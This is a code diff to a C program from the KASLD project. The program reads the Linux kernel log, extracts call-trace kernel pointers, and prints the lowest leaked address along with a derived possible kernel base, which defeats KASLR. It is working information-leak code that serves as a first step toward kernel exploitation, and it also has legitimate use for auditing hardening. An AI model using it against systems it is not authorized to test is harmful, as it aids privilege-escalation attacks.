@@ -1,7 +1,7 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
 //
-// Search kernel log for backtraces and return the first address
-// that looks like a kernel address.
+// Search kernel log for call traces and return the lowest address
+// that looks like a kernel pointer.
 //
 // Requires:
 // - kernel.dmesg_restrict = 0 (Default on Ubuntu systems);
@@ -16,21 +16,8 @@
 #include <sys/klog.h>
 #include <sys/mman.h>
 #include <sys/types.h>
-#include <sys/utsname.h>
 #include <unistd.h>
-
-// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
-unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
-unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;
-
-struct utsname get_kernel_version() {
-  struct utsname u;
-  if (uname(&u) != 0) {
-    printf("[-] uname(): %m\n");
-    exit(1);
-  }
-  return u;
-}
+#include "kasld.h"
 
 #define SYSLOG_ACTION_READ_ALL 3
 #define SYSLOG_ACTION_SIZE_BUFFER 10
@@ -57,56 +44,43 @@ int mmap_syslog(char **buffer, int *size) {
   return 0;
 }
 
-unsigned long search_dmesg(char *needle) {
+unsigned long search_dmesg_kernel_pointers() {
   char *syslog;
+  char *ptr;
   int size;
-  const int addr_len = sizeof(long*) * 2;
   unsigned long addr = 0;
+  unsigned long leaked_addr = 0;
 
   if (mmap_syslog(&syslog, &size))
     return 0;
 
-  char *substr = (char *)memmem(&syslog[0], size, needle, strlen(needle));
-  if (substr == NULL)
-    return 0;
+  printf("[.] searching dmesg for call trace kernel pointers ...\n");
 
-  char *addr_buf;
-  addr_buf = strstr(substr, "<ffffffff");
+  ptr = strtok(syslog, "[<");
+  while ((ptr = strtok(NULL, "[<")) != NULL) {
+    char *endptr = &ptr[strlen(ptr)];
+    leaked_addr = (unsigned long)strtoull(&ptr[0], &endptr, 16);
 
-  if (addr_buf == NULL)
-    addr_buf = strstr(substr, "[ffffffff");
+    if (!leaked_addr)
+      continue;
 
-  if (addr_buf == NULL)
-    return 0;
+    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
+      //printf("Found kernel pointer: %lx\n", leaked_addr);
+      if (!addr || leaked_addr < addr)
+        addr = leaked_addr;
+    }
+  }
 
-  char *endptr = &addr_buf[addr_len];
-  addr = strtoul(&addr_buf[1], &endptr, 16);
-
-  if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
-    return addr;
-
-  return 0;
+  return addr;
 }
 
 int main(int argc, char **argv) {
-  printf("[.] searching dmesg ...\n");
-
-  struct utsname u = get_kernel_version();
-
-  /* this technique should also work on 32-bit. lazy */
-  if (strstr(u.machine, "64") == NULL) {
-    printf("[-] unsupported: system is not 64-bit.\n");
-    exit(1);
-  }
-
-  unsigned long addr = search_dmesg("Oops");
+  unsigned long addr = search_dmesg_kernel_pointers();
   if (!addr)
     return 1;
 
-  printf("leaked address: %lx\n", addr);
-
-  printf("kernel base (possible): %lx\n", addr & 0xffffffffff000000ul);
-  printf("kernel base (possible): %lx\n", addr & 0xfffffffffff00000ul);
+  printf("lowest leaked address: %lx\n", addr);
+  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);
 
   return 0;
 }
